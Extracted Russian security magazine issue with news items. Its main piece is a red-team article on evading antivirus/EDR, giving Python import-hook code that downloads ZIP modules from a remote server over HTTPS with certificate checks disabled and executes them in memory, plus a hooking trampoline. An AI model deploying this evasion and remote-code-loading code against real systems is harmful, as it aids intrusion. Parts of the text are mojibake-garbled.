         ðîâàëè óæå áîëåå 7000 êîìïàêò‑äèñêîâ è ñîáèðàþòñÿ îáðàáîòàòü
       åùå 8000. Ýòî áóäåò áåñêîíå÷íûé èñòî÷íèê èíôîðìàöèè è ñàìàÿ êðóï -
         íàÿ çàäà÷à, íàä êîòîðîé ÿ áóäó ðàáîòàòü â òåêóùåì ãîäó».                 »
   Скотт рассказывает, что Discmaster импониру ет ему по многим причинам,
  но главная из них зак лючается в том, что это серь езный удар по скептикам,
  которые часто заявляют, что ник то и никог да не будет просматривать все
  материалы Internet Archive, так как к ним слиш ком сложно получить доступ.
  Теперь есть инстру мент, который сортиру ет и упорядочивает дан ные и делает
   их доступны ми для широкой аудитории.
     Эк сперт  зак лючает,  что  Discmaster —  это  невероятный  инстру мент
  для архивистов, историков, любопытству ющих и людей, которые пытаются
  отыскать полузабытые медиафайлы или работы, считавшиеся утерян ными.
  Под оригиналь ным твитом Скот та поль зователи охот но делились своими
  наход ками такого рода и рассказывали о том, как отыскали давно утрачен ные
  растровые шрифты, ред кие файлы BBS и даже собствен ные прог раммы,
  которые были написаны боль ше двад цати лет назад.


 BUG BOUNTY В РОССИИ

  В Positive Technologies про анализировали крупные и активные плат формы bug bounty по все му
   миру. Наибо лее вос тре бованными плат формы оказались у IT-компаний ( 16% ), онлайн-сер -
   висов ( 14% ), сфе ры услуг ( 13% ) и тор говли ( 11% ), финансовых организаций ( 9% ).





                    От расле вое рас пре деле ние учас тников плат форм bug bounty


  Мировой тренд в целом кор релирует с рос сийским. Основная мас са заказ чиков рос сийских
   прог рамм bug bounty пред став лена час тным биз несом, обслуживающим боль шое количес тво
   клиентов: бан ками , он лайн‑сер висами , элек трон ной коммерци ей, разработ чиками
   IT-про дук тов. Глав ным драйвером раз вития bug bounty в Рос сии могут стать гос сектор
   и ор ганизации кри тичес кой инфраструк туры .

  В 2021 году количес тво прог рамм bug bounty, по данным HackerOne, уве личилось на 34% ,
   а иссле дователи выявили на 21% боль ше уяз вимос тей. К 2027 году рынок bug bounty может
   вырас ти до 5,5 миллиар да долларов.

  В 2020 году Рос сия вошла в тройку стран с самым высоким уров нем дохода баг ханте ров,
   обог нав Ки тай и Гер манию .





               Сред няя сум ма воз награж дения в зависимос ти от опас ности уяз вимос ти

 Вразноевремяпорядка40компанийзапускалиоткрытыепрограммыbugbountyвРФ.Встра-
  недействуюттриосновныеплатформы:Bugbounty.ru,Standoff365BugBountyиBI.ZONE
  BugBounty.

   При этом по лови на прог рамм bug bounty в Рос сии закрытые, то есть количес тво иссле дова-
   телей в них ограниче но и заранее ого воре но.





           Рас пре деле ние плат форм bug bounty в мире в зависимос ти от про водимых программ

   Рос сийские компании готовы платить иссле дователям от нес коль ких десят ков до сотен
  тысяч руб лей за найденную уяз вимость. В отдель ных случаях выплаты дос тигают 1 000 000
   рублей и более.


  В Positive Technologies ожидают бур ного рос та рос сийских прог рамм bug bounty в ближайшее
   вре мя. Дело в увеличении количес тва и слож ности киберугроз, недос тупнос ти
   в Рос сии мно гих мировых сер висов, а также рас ширении спектра организаций, прибега-
   ющих к bug bounty: уме ния баг ханте ров стали исполь зовать неболь шие компании и го -
  сударс твен ные учреждения .





 БАГ В ЯДРЕ LINUX
 ПОРТИТ ДИСПЛЕИ
  Стабиль ная версия ядра Linux (5.19.12), релиз которой состоялся 28 сен -
   тября 2022 года, может негативно влиять на дисплеи ноут буков с Intel GPU
  на борту. Поль зователи сообщают, что наблюдают стран ные белые вспыш ки,
  а разработ чики предупреждают, что существу ет вероятность необратимого
  повреждения экрана.
     На стран ное поведение своих устройств жалу ются многие поль зователи,
  включая владель цев ноут буков Framework. Они сообщают о проблемах с Arch
  и Fedora после обновления ядра Linux до версии 5.19.2. Экраны их устройств
  мерцают ярким белым светом, который сами пострадавшие сравнивают
  со стробоскопами рет рорейвов.
     Как рассказал инженер Intel и разработ чик ядра Вилле Сирь ял (Ville Syrjäl),
   этот баг не толь ко раздражает и не дает нормаль но работать, но и может при-
  вести к повреждению дисплея устройства. Изу чив логи пострадавших поль -
   зователей, исследователь пришел к выводу, что проблема связана с графичес-
  ким драйвером и багом, который вызывает нежелатель ные задержки подачи
  питания дисплея. В итоге Сирь ял категорически не рекомен дует исполь зовать
   ноут буки с Intel GPU вместе с ядром Linux версии 5.19.12.
    Фак тически проблема зат рагивает все ноут буки на базе процессоров Intel,
  где дисплей под ключен напрямую к встроенной графике. Это значит, что баг
   касается ноут буков Nvidia Optimus и некоторых ноут буков Intel + Radeon, так
   как iGP управляет основным дисплеем, даже если активен дискрет ный GPU.
    В настоящее время Грег Кроа-Хартман (Greg Kroah-Hartman), отвечающий
   за стабиль ную вет ку ядра Linux, уже под готовил патч для этой проблемы, и в
  ядре версии 5.19.13 ошибка была устранена.


         «Ýòîò âûïóñê ïðåäíàçíà÷åí äëÿ óñòðàíåíèÿ ðåã ðåññà â íåêîòîðûõ ãðà-
        ôè÷åñêèõ ñèñòåìàõ  Intel, ãäå íàáëþäàëèñü ïðîáëåìû ñ 5.19.12. Åñëè «
          ó âàñ íåò ïðîáëåìû ñ 5.19.12, íåò íåîáõîäèìîñòè â îáíîâëå íèè», —
        ïèøåò ðàçðàáîò÷èê.                 »
  Поль зователям рекомен дует ся проверять номера версий ядра перед обновле-
  нием и избегать Linux 5.19.12, если они исполь зуют ноут буки с процессорами
    Intel. Тем, кто уже пострадал от этой ошибки, рекомен дует ся не оставлять
   экран в режиме мигания надолго, так как это увеличивает вероятность необ-
  ратимых повреждений.


  АТАКИ НА «СБЕР»





   Замес титель  пред седате ля  «Сбер банка»  Станис лав  Куз нецов  рас сказал  жур налис там,
   что 7 октября 2022 года на 440 сер висов банка была совер шена одна из крупнейших DDoS-атак
   в исто рии финансового учрежде ния. Куз нецов считает, что целью этой атаки была останов ка
   работы банка, однако сбо ев в работе «Сбер банка» не воз никло.

            «Недав но мы выдер жали крупнейшую атаку. Это про исхо дило 7 октября. Тог - →         да по заранее под готов ленно му плану, с очень длитель ной под готов кой была
          спланиро вана    спе циаль ная   DDoS-атака,    в   которой    учас тво вало
          не менее 104 000 хакеров, которые вели эту атаку с инфраструктуры, рас -
         положенной в зарубежных государс твах, чис ленностью не менее 30 000 устрой-
           ств»,


  — сообщил Куз нецов и отме тил, что с начала года на «Сбер банк» было совер шено 470 DDoS-
   атак — боль ше, чем за пос ледние семь лет суммарно.





 ИЛОН МАСК КУПИЛ
 TWITTER
  В кон це октября Илон Маск наконец завершил сделку по покупке Twitter
   за 44 миллиарда долларов, переговоры о которой длились более полугода
  и из-за которой ком пания даже подавала на него в суд, пытаясь заставить соб-
  людать достигну тое исходно сог лашение о слиянии.
     У себя в Twitter Маск сообщил, что «птичка освободилась» (the bird is freed),
  и прямо в день под писания бумаг уволил ряд топ-менед жеров Twitter, включая
   главу ком пании Парага Агравала (Parag Agrawal), который был назначен на этот
   пост в ноябре 2021 года, ког да основатель и бывший глава соцсети Джек Дор-
  си покинул ком панию.
     «Маск уволил CEO Парага Агравала и главного финан сового дирек тора
  Неда Сигала после зак рытия сделки», — сообщило издание The Wall Street
   Journal. Так же были уволены руководитель отдела правовой политики Twitter
  Вид жая Гад де и главный юрисконсульт Шон Эджетт. При этом журналисты
  сообщили, что уволен ным топ-менед жерам выплатят многомиллион ные ком -
  пенсации (от 38,7 до 11,2 миллиона долларов США).
    Пока неясно, кто теперь возглавит ком панию, перешед шую в собствен -
   ность Илона Маска. Времен ным генераль ным дирек тором Twitter станет сам
  Маск, а затем, вероятно, он усту пит эту должность кому-то дру гому.
     Нужно отметить, что отношения Маска и Агравала были натяну тыми в пос-
  ледние месяцы, пока Маск пытался отказать ся от сделки. В августе текущего
  года Маск даже вызывал бывшего главу Twitter на публичные дебаты, пред -
   лагая ему обсу дить количество ботов в социаль ной сети. «Пусть он докажет
  обществен ности, что в Twitter ежед невно активны менее 5% фейковых или спа-
  мерских аккаунтов!» — писал Маск. Вместо этого ком пания продолжила
  судебную тяжбу против Маска, что в итоге помог ло Twitter завершить эту сдел-
   ку.
     Так же стоит сказать, что Маск неод нократ но публиковал твиты с критикой
    (1 , 2 ) под хода Гад де к модерации кон тента.
    По информации СМИ, посетив штаб-квартиру Twitter в Сан-Фран циско,
  Маск пообещал, что не будет уволь нять 75% сот рудников ком пании (штат
   Twitter насчитывает 7500 человек), как сообщалось ранее. При этом Маск при-
   вез с собой разработ чиков из ком пании Tesla, которые якобы должны будут
  оценить код и работу сот рудников Twitter, а затем пред ставить отчет новому
  владель цу.
     Напом ню, ранее Маск заявлял, что приобретает Twitter ради прин ципов сво-
  боды слова, которых, по его мнению, должна придерживать ся плат форма. Так -
  же он планировал бороть ся с армиями ботов, спамом и так называемы ми
  теневы ми банами.
     За несколь ко часов до завершения сделки Маск опубликовал обращение
   к рек ламодателям, в котором заверил, что Twitter не «превратит ся в доступный
  для всех кош мар», где можно будет публиковать что угод но без последствий,
  и в очеред ной раз под черкнул, что плат форму он приобрел не ради денег.


        «Ïðè÷èíà, ïî êîòîðîé ÿ ïðèîáðåë  Twitter, çàê ëþ÷àåòñÿ â òîì, ÷òî
         äëÿ áóäóùå ãî öèâèëèçàöèè  î÷åíü âàæíî èìåòü îáùóþ „öèôðîâóþ «
         ãîðîäñêóþ ïëîùàäü“, íà êîòîðîé ìîæíî çäîðîâûì ñïîñîáîì îáñóäèòü
        øèðîêèé ñïåêòð óáåæäåíèé, íå ïðèáåãàÿ ê íàñèëèþ, — ïèøåò Ìàñê. —
       Â íàñòîÿùåå âðå ìÿ ñóùåñòâóåò îãðîìíàÿ îïàñíîñòü òîãî, ÷òî ñîöèàëü-
        íûå ñåòè ðàñêîëþòñÿ íà êðàéíå ïðàâûå è êðàéíå ëåâûå ýõî‑êàìåðû,
         êîòîðûå áóäóò ïîðîæäàòü åùå áîëüøóþ íåíàâèñòü è ðàçäåëÿòü íàøå
        îáùåñòâî».                 »

  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Быв шие руково дите ли eBay получили тюремные сро ки за прес ледование четы жур налис тов


   Часть раз работ чиков Nginx вер нулась в Рос сию и запус тила про ект Angie


  По явил ся PoC-экс пло ит для PlayStation 5. Он срабатывает лишь в 30% случаев


   Сот ни сер веров Microsoft SQL оказались зараже ны бэкдором Maggie


   Кросс-чейн-мост BSC Token Hub взло ман. Похище но 566 мил лионов дол ларов


   Аме риканские влас ти перечис лили «любимые» уяз вимос ти китайских хакеров


   У Microsoft про изошла утечка данных, кос нувшаяся 65 000 организаций по все му миру


   Трафик в Android уте кает за пре делы VPN-туннелей даже при включенной функции Always-on
  VPN


  По лиция хит ростью выманила ключи дешифрования у опе рато ров вымогателя DeadBolt


   Слабый блочный шифр в Ofce 365 приводит к рас крытию содер жимого сообщений
COVERSTORY





        ЗАПУСКАЕМ МАЛВАРЬ
        ИЗ СЛЕПОЙ ЗОНЫ EDR




В этой статье я покажу, как воору жить
standalone-интер претатор Python для заг -
рузки  опасных  зависи мостей  пря мо
в память при помощи инстру мен та Pyramid
(не путать с веб-фрей мвор ком). Потен -            snovvcrash                                                                                       Безопасник, временами
циально это поз воля ет обой ти анти вирус-         питонщик, местами                                                                                       криптоана(рхист)литик, по
ную  защиту  при  пен тесте  и  скрыть      необходимостиадминистраторсистемный
источник  подоз рительной  телемет рии        snovvcrash@protonmail.ch
от EDR при операци ях Red Team.


Сколь ко  есть  разных  техник  обхода  антивирусных механизмов и EDR-
решений — и не сосчитать! Обфускация и шифрование полезной наг рузки,
динамическое разрешение WinAPI, системные вызовы , отложен ное исполне-
ние, уклонение от хуков защит ных продук тов, под пись .exe спу фан ными сер-
тификатами, флук туирующие начин ки, под мена стека вызовов... Кажет ся, этот
список можно продолжать бесконечно.
  А если пред положить, что существу ют такие «слепые» зоны, оставаясь
в пределах которых можно безнаказан но творить что заблагорассудит ся (в гра-
ницах разум ного) и не боять ся при этом спалить весь ред тиминг? Что ж, такие
зоны действитель но есть, и это никакой не Ring 0, а обычный интерпретатор
Python! На питоне написано огромное количество наступатель ных утилит,
но запускать их принято с удален ной машины. Почему? Ах да, зависимости...
  Сегод ня мы с тобой разберем под ход Living-Oﬀ-the-Blindspot , пред став-
ленный исследователем Диего Каприот ти (@naksyn ) на недавнем DEF CON
30.




                       Статья имеет озна коми тельный характер и пред -
                       назна чена для специалис тов по безопас ности,
                       проводя щих тес тирова ние в рамках контракта.
                       Автор и  редакция  не  несут  ответс твенности
                        за любой  вред, при чиненный  с при менением
                       изложенной информа ции. Рас простра нение вре-
                      донос ных прог рамм, нарушение работы сис тем
                      и  нарушение  тай ны  перепис ки  прес леду ются
                      по закону.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY




          ЗАПУСКАЕМ МАЛВАРЬ ИЗ СЛЕПОЙ ЗОНЫ EDR





×ÒÎ Ê ×ÅÌÓ È ÏÎ×ÅÌÓ

Давай сперва окинем взором теорию и разберем ся, почему твой антивирус
(или EDR) знает о тебе все, потом поймем прин цип бесфайлового импорта
модулей в  Python, а затем перейдем  к рассмот рению его реализации
в Pyramid. Для первых двух частей я восполь зуюсь слайдами оригиналь ного
выступления.
  Первое, на чем хочет ся заострить внимание, — это две самые любимые
техники разработ чиков защит ного софта для анализа поведения прог рамм:
 • ху ки Windows API (Win32 или Native) в поль зователь ском пространстве;
 • под писка на уведом ления о чувствитель ных событиях в пространстве ядра.


Õóêè â userland





  EDR VISIBILITY — Usermode Hooks (изображение — Python vs Modern
  Defenses)

Чтобы отслеживать злоупот ребление механизмами Windows API, твой анти-
вирус, скорее всего, ïàò÷èò äæàìïàìè реализации фун кций из библиотек
user32.dll и ntdll.dll после их заг рузки в память анализируемым процес-
сом. После вызова таких, казалось бы, оригиналь ных фун кций WinAPI ничего
не подозревающий процессор наталкивается на соот ветству ющий джамп, ука-
зывающий на область памяти уже под гру жен ной библиотеки средства защиты,
и следует по нему, в резуль тате чего кон троль над потоком выполнения прог -
раммы передается антивиру су.
   Теперь «вирусоненавистник» может как угод но измы вать ся над твоим про-
цессом, исследуя его виртуаль ную память и проводя дру гие одному богу
известные  проверки,  по  резуль татам  которых  будет  вынесен  вердикт:
«виновен» (заблокировать выполнение API-фун кции или, может, вообще убить
процесс) или «оправдан» («отпустить» поток выполнения исходной прог -
рамме).
   Что-то похожее мы проворачивали, ког да эксперимен тировали с техникой
флук туирующего шелл-кода. Тог да наш джамп (патч для перехвата кон троля
над фун кцией kernel32!Sleep) выг лядел примерно так:


/*


{ 0x49, 0xBA, 0x37, 0x13, 0xD3, 0xC0, 0x4D, 0xD3, 0x37, 0x13,
0x41, 0xFF, 0xE2 }


Disassembly:


0:  49 ba 37 13 d3 c0 4d    movabs r10,0x1337d34dc0d31337
7:  d3 37 13
a:  41 ff e2                jmp    r10


*/


uint8_t trampoline[] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
// mov r10, addr
    0x41, 0xFF, 0xE2
// jmp r10
};




                   Я уже рекомендовал статью @ShitSecure A tale
                             of EDR bypass methods, где дос тупным языком
                       разоб раны  популярные  при емы,  которые  при -
                      меня ются средс тва ми защиты, и способы их
                       обхода. Повторение — мать учения, и к тому же
                      там тоже есть про хуки в userland.



Óâåäîìëåíèÿ îáðàòíîãî âûçîâà â ÿäðå





  EDR VISIBILITY — Kernel Callbacks (изображение — Python vs Modern
  Defenses)

Ку да более мощный механизм сохранения кон троля над поведением процес-
сов реализует ся через ядерный механизм Notification Callback Routines.
Он предоставляет интерфейсы для реализации фун кций под писки на потен -
циаль но опасные события, например вызов ntdll!NtCreateProcess. Ког да
получено уведом ление о создании нового процесса, EDR бежит внед рять свои
библиотеки в целевой процесс, чтобы в том числе иметь возможность пат чить
стан дартные библиотеки Windows API, как описано в предыду щем разделе.
   Дру гой показатель ный пример того, зачем нужны Kernel Callbacks, — тай-
млайн запрета получения доступа к памяти процесса lsass.exe, описан ный
в дру гом кру том ресерче с DEF CON 30 — EDR detection mechanisms
and bypass techniques with EDRSandBlast авторов @th3m4ks и @_Qazeer.





  How come the EDR knows everything? (изображение — EDR detection
  mechanisms and bypass techniques with EDRSandBlast)

Так, получая уведом ления о нежелатель ных событиях на каждом из этапов
дам па LSASS (создание процесса дам пера, получение им хен дла lsass.exe,
чтение памяти lsass.exe,  создание файла с  резуль тиру ющим  слепком
памяти),  антивирус  или EDR может выстроить многоуровневую  защиту
от получения злоумыш ленником учет ных дан ных из памяти сетевого узла.
  Су ществу ет  куча  дру гих  под ходов,  как  предот вратить  вредоносную
активность на конечных точках, например сканирование памяти запущен ных
процессов по планировщику, но для базового пред ставления нашей темы это-
го будет достаточно.


Ñëåïûå çîíû EDR





                   Пирамида боли ред тимера

В исходной  статье автор разделяет  стратегии байпаса EDR на четыре
основные области. Мы сок ратим их до трех:
 1. Свести к миниму му свое присутствие на узле, где установлен EDR. Для это-
   го достаточно иметь SOCKS-прок си на стороне жертвы и маршру тизи-
   ровать через него трафик во внут реннюю сеть или к локаль ным ресурсам
  машины (Impacket тебе в помощь).
 2. Всту пить в априорно неравный бой с EDR: анху кать библиотеки, криптовать
   свой арсенал до посинения, жить с sleep 100500 , выполняя по одной
   коман де в сут ки, думать о рисках каждого введен ного в кон соль сим вола.
  Это сложно (очень). Обычно это можно себе позволить, если весь твой инс-
   тру мен тарий кастомный, но, как люди исполь зуют ту же «Кобу» (запрещен -
  ный на территории РФ инстру мент) на проектах, я пока так и не понял.
 3. Оперировать из слепых зон EDR. Сюда можно отнести исполь зование
   легитим ных тулз администрирования и разработ ки во вредоносных целях,
   например  воору жить  официаль ный  (и  под писан ный)  бинарь  Python
   для малварного трейдкрафта прямо на машине-жертве.

Что происходит внут ри интерпретатора Python и как трак товать те или иные
маркеры его поведения? «А черт его знает...» — так ответят не толь ко боль -
шинство из нас, но и многие вен доры защит ного ПО. Для нас прелесть этого
язы ка в том, что, начиная с версии 3.7, официаль ная сборка интерпретатора
поставляется в standalone-виде, то есть не требует установки на хост.
   Кроме того, до тех пор, пока мы остаемся в пределах интерпретатора (то
есть не выполняем инжекты в дру гие процессы или не создаем новых), вся
телемет рия исходит от под писан ного python.exe, а это не облегчает жизнь
защит ному ПО, ког да надо разбирать ся, что из этого есть что.
   Итак, что же нам нужно, чтобы воору жить standalone-интерпретатор Python?


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY




          ЗАПУСКАЕМ МАЛВАРЬ ИЗ СЛЕПОЙ ЗОНЫ EDR





ÁÅÑÔÀÉËÎÂÛÉ ÈÌÏÎÐÒ ÇÀÂÈÑÈÌÎÑÒÅÉ

Для начала определим ся, так ли оно нам надо — заг ружать модули прямо
в память? Чем плохо принести их на хост и положить рядом с интерпретато-
ром?





              Статический анализ против сорцов Impacket

Как можно видеть, такой трюк у нас не прокатит. Да и вообще сохранять
что-либо на диск — плохая прак тика. Ког да есть возможность, лучше всег да
этого избегать.




В этой статье мы снова будем исполь зовать решение Kaspersky Endpoint
Security в качестве мерила резуль татов наших эксперимен тов. Чтобы не было
обвинений в пред взятости или домыслов о том, что у меня какие-то личные
счеты с этим продук том (так как он уже не в первый раз встречает ся в моих
тек стах), я сразу расставлю все точки над i.
 1. Исходя из моего личного опы та KES — лучшее антивирусное решение
   в ру-сег менте. Поэтому логика его исполь зования в лабораторных испы -
   таниях очевид на: обойдешь его — значит, скорее всего, обойдешь продук -
   ты дру гих вен доров, ког да они встретят ся в проекте.
 2. Чаще всего как на внут ренних пен тестах, так и при операциях Red Team мы
   (отдел анализа защищен ности Angara Security) встречаем ся имен но с KES,
   поэтому  опять же  целесообразно  исследовать имен но  его  реак цию
   на «внеш ние раздражители», чтобы знать, чего нам ожидать.

К тому же я знаю, что коллеги «по ту сторону» дефен са иног да просматривают
мои каляки, поэтому, возможно, таким образом я тоже вношу свой малень кий
вклад в развитие этого продук та.


Вся магия бесфайлового импорта внеш них модулей в Python кроется в фиче
Meta Import Hooks, введен ной неког да великодуш ным пожизненным дик -
татором Гвидо ван Россумом в ревизии 302 руководства PEP. В этом кон тек сте
Meta hooks — это способ разрешения импорта, реализован ный в виде класса
и стреляющий в самом начале алгорит ма поиска модуля. Для сравнения есть
дру гой способ импортировать зависимости — Path Import Hooks, который,
как можно догадать ся по названию, основан на поиске нужного питону модуля
по определен ным путям, заранее известным интерпретатору.
   Текущие значения Meta hooks можно посмотреть в перемен ной sys.
meta_path, Path hooks — в sys.path.





        Стан дартные значения Import hooks для Embeddable Python

То есть все, что нам нужно сделать, — это написать собствен ный класс
импортера модулей, которые мы будем получать в виде архивов, например,
по HTTP, и зарегистрировать его как Meta hook. Изи!
   Разберем реализацию такого класса в инстру мен те Pyramid.


CFinder
Как известно, все новое — это хорошо забытое старое, поэтому цепочка
заимствования класса CFinder (Custom Finder) тянет ся аж с 2015 года: из про-
екта remote_importer он был позаимствован коман дой EmpireProject в реали-
зации С2-аген та EmPyre и далее мель кал в некоторых дру гих наступатель ных
фреймворках.
  Пойдем сверху вниз, начав со вспомогатель ных методов.


CFinder._get_info
class CFinder():


    def __init__(self, repo_name):
        self.repo_name = repo_name
        self._source_code = {}


    def _get_info(self, repo_name, full_name):
        parts = full_name.split('.')
        submodule = parts[-1]
        module_path = '/'.join(parts)


        for suffix, is_package in (('.py', False), ('/__init__.py'
, True)):
            relative_path = module_path + suffix
            try:
                ZIPPED[repo_name].getinfo(relative_path)
            except KeyError:
                continue
            else:
                return submodule, is_package, relative_path


        raise ImportError(f'Unable to locate module {submodule}
in the {repo_name} repo')

Конструк тор принимает в качестве аргу мен та имя модуля, который мы хотим
импортировать, а метод _get_info отдает информацию о существовании того
или иного питонячего файла в архиве ZIP. Если при обработ ке очеред ного
исходника интерпретатор нат кнет ся на инструк цию import  <ИМЯ_МОДУЛЯ>
(причем неважно, в верхнеуровневом скрипте или в импортах дру гих модулей)
и дру гие импортеры не смогут с ней справить ся, этот вспомогатель ный метод
попытается разрешить зависимость сначала по пути АРХИВ → <ИМЯ_МОДУЛЯ>.
py, а потом по пути АРХИВ → <ИМЯ_МОДУЛЯ>/__init__.py, если первая попыт -
ка провалилась.
   Для наг лядности я возь му простой и всем известный модуль colorama,
добавлю вот такую строчку перед ключевым словом return:


print(submodule, is_package, relative_path)

Затем заг ружу модуль из памяти. Детали заг рузки нам пока неин тересны,
просто посмотрим на вывод print.





             Ин формация об импортах в модуле colorama

Видим, что информация обо всех импортах при заг рузке модуля colorama раз-
решилась рекурсивно. Идем даль ше.


CFinder._get_source
def _get_source_code(self, repo_name, full_name):
    submodule, is_package, relative_path = self._get_info(
repo_name, full_name)


    full_path = f'{repo_name}/{relative_path}'
    if relative_path in self._source_code:
        code = self._source_code[relative_path]
        return submodule, is_package, full_path, code


    try:
        code = ZIPPED[repo_name].read(relative_path).decode()
        code = code.replace('\r\n', '\n').replace('\r', '\n')
        self._source_code[relative_path] = code
        return submodule, is_package, full_path, code
    except:
        raise ImportError(f'Unable to obtain source code for
module {full_path}')

Вспомогатель ный метод _get_source_code запрашивает информацию о мес-
тоположении файла с искомым исходником, который требует ся при импорте,
с помощью рассмот ренного выше метода _get_info. После того как файл
найден, мы лезем за ним по отданному пути в ZIP-архив, читаем его содер-
жимое и отдаем в качестве резуль тата вместе с дополнитель ной информацией
об именах и расположении модуля. Пока все просто.





        Содержимое файлов с исходным кодом модуля colorama


CFinder.find_module
def find_module(self, full_name, path=None):
    try:
        self._get_info(self.repo_name, full_name)
    except ImportError:
        return None


    return self

Под бираемся к самому интересному — методам, которые будет исполь зовать
интерпретатор после регистрации метаху ка. Метод nd_module должен при-
сутствовать в классе резолвера и отдавать информацию о заг рузчике модуля.
В нашем слу чае это просто обертка над реализован ным ранее методом
_get_info.


CFinder.load_module
def load_module(self, full_name):
    _, is_package, full_path, source = self._get_source_code(self.
repo_name, full_name)


    code = compile(source, full_path, 'exec')
    spec = importlib.util.spec_from_loader(full_name, loader=None)
    module = sys.modules.setdefault(full_name, importlib.util.
module_from_spec(spec))
    module.__loader__ = self
    module.__file__ = full_path
    module.__name__ = full_name


    if is_package:
        module.__path__ = [os.path.dirname(module.__file__)]
    exec(code, module.__dict__)


    return module

Сердце класса CFinder — метод load_module, вызывающий встроенную фун -
кцию compile для пред варитель ной ком пиляции кода импортируемого модуля
и его под готовки к последу ющей передаче на вход фун кции exec. Так же в рам -
ках этого метода мы оформляем объект модуля, чтобы для интерпретатора он
не отличался от обычного импорта с диска.
  В общем-то, это и есть вся магия. В коде Pyramid есть реализация дру гих
необязатель ных методов, таких как get_data и get_code, но для нас они
не пред ставляют интереса и могут быть исключены из финаль ной реализации.


Èñïîëüçîâàíèå CFinder
@staticmethod
def install_hook(repo_name):
    if repo_name not in META_CACHE:
        finder = CFinder(repo_name)
        META_CACHE[repo_name] = finder
        sys.meta_path.append(finder)


@staticmethod
def hook_routine(zip_name, zip_bytes):
    ZIPPED[zip_name] = ZipFile(io.BytesIO(zip_bytes), 'r')
    CFinder.install_hook(zip_name)

Исполь зовать написан ный класс проще простого: сначала мы вызываем ста-
тический метод CFinder.hook_routine и отдаем ему имя и байты (содер-
жимое) ZIP-архива, заг ружен ного извне. Это добро сохраняется в глобаль но
определен ный словарь ZIPPED, уже мель кавший в коде рань ше, и далее
метахук регистрирует ся фун кцией install_hook. Последняя добавляет экзем -
пляр нашего кастомного класса CFinder к списку sys.meta_path. При попыт ке
выполнить импорт, который не будет разрешен никаким дру гим импортером,
в игру всту пит наш CFinder и под гру зит требуемый модуль из памяти.


def build_http_request(filename):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE


    request = urllib.request.Request(f'https://{PYRAMID_HOST}:{
PYRAMID_PORT}/{filename}.zip')
    auth = b64encode(bytes(f'{PYRAMID_USERNAME}:{PYRAMID_PASSWORD}
', 'ascii')).decode()
    request.add_header('Authorization', f'Basic {auth}')


    return context, request


def download_and_import():
    for module in PYRAMID_TO_IMPORT:
        print(f'[*] Downloading and importing module in memory: {
module}')


        context, request = build_http_request(module)
        with urllib.request.urlopen(request, context=context) as
response:
            zip_bytes = response.read()
            CFinder.hook_routine(module, zip_bytes)


    print('[+] Hooks installed!')

Для поряд ка приведу финаль ные фун кции-помощники, забирающие зипы
с удален ного сервера по HTTPS с Basic-аутен тификацией. Здесь вроде все
понят но без дополнитель ных пояснений.


Îñîáûå ñëó÷àè èìïîðòà
К сожалению, не все питоновские модули можно заг рузить из памяти. Речь
идет в основном о файлах .pyd, пред ставляющих собой динамически разделя-
емые библиотеки с байт-кодом Python, и о стан дартных для Windows DLL-
либах, иду щих в ком плек те с некоторыми модулями.
   Такого стафа навалом, например, в библиотеках с криптографией, которые
всег да нужны при работе с протоколами.





                  PYD-файлы в модуле Cryptodome

Чтобы удовлетворить такие зависимости, нам придет ся заг ружать и рас-
паковы вать их на диск. За это отвечает хелпер download_and_unpack:


def download_and_unpack():
for module in PYRAMID_TO_UNPACK:
    print(f'[*] Downloading and unpacking module: {module}')


    context, request = build_http_request(module)
    with urllib.request.urlopen(request, context=context) as
response:
        zip_bytes = response.read()


    with ZipFile(io.BytesIO(zip_bytes), 'r') as z:
        z.extractall(os.getcwd())

Полный код того, что у меня получилось после незначитель ного рефак торин га
исходного проекта, можно найти у меня на GitHub. Рядом лежат пресеты
для генерации боевых скриптов на основе общего тем плейта, которы ми мы
будем поль зовать ся в следующем разделе.




                    Пока готовил матери алы для статьи, нашел инте-
                       рес ный репози торий  httpimport , который, судя
                      по опи санию, умеет делать все то же самое, что
                       реали зова ли мы, но с допол нительными плюш -
                        ками. Сам я этот код не тес тил, но, может, тебе
                       будет интерес но с ним поиг рать.





                                       Продолжение статьи →
ВЗЛОМ





Центр  сер тифика ции  в  Active  Directory
может   стать  отличной  целью  ата ки
при выпол нении тестирова ния на про ник -
новение. В этой статье мы рассмот рим,
как устро ен этот центр, как про исхо дит          whoam1ns3                                                                                 19 y.o. Security Researcher /
выдача  сер тифика тов  и   как  можно               Developer                                                                                whoamins33@gmail.com
повысить при вилегии в домене, используя
воз можности Active Directory Certication
Services.


В Windows Server присутству ет роль под названием Active Directory Certication
Services (AD CS), которая нужна для реализации инфраструк туры откры тых
ключей (PKI) в сетях с кон троллером домена. AD CS пред назначена для выдачи
сертификатов поль зователям и компь ютерам. Сертификаты могут исполь -
зовать ся для шифрования, под писи, аутен тификации и тому подобного, и в
целом эта роль выг лядит как сервис для повышения безопасности в домене.
  Чаще всего при пен тесте домена Active Directory конечной целью ставит ся
перехват учет ной записи администратора. Получив админа, можно шифровать
систему сдавать отчет и закан чивать проект. Есть множество способов добить -
ся указан ной цели, и один из них — эксплу атация неправиль ных кон фигураций
шаблонов, по которым выпускают ся сертификаты.
  На пути к получению администратора домена нам понадобит ся настоящий
швейцарский нож в мире сертификатов —  Certipy. Он позволяет искать
информацию о шаблонах, запрашивать сертификаты и аутен тифицировать ся
при помощи сертификатов, но самое главное — проводить атаки.


ÖÅÍÒÐ ÑÅÐÒÈÔÈÊÀÖÈÈ

В рам ках Active Directory центр сертификации реализует фун кцию инфраструк -
туры откры тых ключей. В свою очередь, инфраструк тура откры тых ключей
(PKI) — это набор служб и ком понен тов, позволяющих управлять ключами
и сертификатами в сети.
  Основная цель цен тра сертификации состоит в выдаче, отзы ве, перевы пус-
ке сертификатов и тому подобном. Центр сертификации, разверну тый первым,
является корнем инфраструк туры откры тых ключей. Далее можно разверты вать
под чинен ные ЦС, расположен ные в иерархии инфраструк туры откры тых клю-
чей, в верхней части которой находит ся корневой ЦС.


ÑÅÐÒÈÔÈÊÀÒÛ

Cертификат в общем смысле — это документ формата X.509, содержащий
информацию о своем владель це. Может исполь зовать ся как средство иден -
тификации и аутен тификации.





